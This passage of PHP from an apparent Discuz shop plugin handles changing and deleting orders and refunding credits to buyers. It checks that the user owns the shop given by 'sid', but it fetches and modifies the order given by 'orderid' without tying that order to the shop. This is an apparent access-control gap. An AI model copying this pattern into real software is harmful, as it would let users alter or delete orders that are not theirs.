			if(!in_array($_G['uid'],$shopadmin)){
				echo 'it618_split'.it618_brand_getlang('s1220');exit;
			}
		}else{
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
			if($it618_brand_brand['it618_uid']!=$uid){
				echo 'it618_split'.it618_brand_getlang('s671');exit;
			}
		}
		
		$it618_brand_order=C::t('#it618_brand#it618_brand_order')->fetch_by_id($_GET['orderid']);
		
		if($it618_brand_order['it618_state']==2){
			if($_GET['type']==1)$it618_state=3;else $it618_state=4;
			C::t('#it618_brand#it618_brand_order')->update($_GET['orderid'],array(
				'it618_state' => $it618_state
			));
			
			echo 'okit618_split'.it618_brand_getlang('s1545');exit;
		}
	}

}


if($_GET['ac']=="shopdelorder"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['adminsid'])){
			$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo 'it618_split'.it618_brand_getlang('s1220');exit;
			}
		}else{
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
			if($it618_brand_brand['it618_uid']!=$uid){
				echo 'it618_split'.it618_brand_getlang('s671');exit;
			}
		}
		
		$it618_brand_order=C::t('#it618_brand#it618_brand_order')->fetch_by_id($_GET['orderid']);
		
		if($it618_brand_order['it618_state']==1){
			C::t('common_member_count')->increase($it618_brand_order['it618_uid'], array(
				'extcredits'.$it618_brand['brand_credit'] => $it618_brand_order['it618_jfcount'])
			);
			DB::query("delete from ".DB::table('it618_brand_order')." where id=".$it618_brand_order['id']);
			
			echo 'okit618_split'.it618_brand_getlang('s1567');exit;
		}
	}

}
//From: Dism��taobao��com
?>